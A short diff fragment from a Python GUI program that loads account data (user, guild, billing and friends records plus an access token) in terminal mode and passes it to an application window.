+        app.mainloop()
+    else:
+        u_data, c_data, g_data, b_data, f_data, u_ch_map, active_token, c_info = validate_and_load_in_terminal()
+
+        app = App(
+            user_data=u_data,
+            connections_data=c_data,
+            guilds_data=g_data,
+            billing_data=b_data,
+            friends_data=f_data,
+            user_to_channel_map=u_ch_map,
+            token=active_token,
+            cloud_info=c_info
+        )
+        app.mainloop()
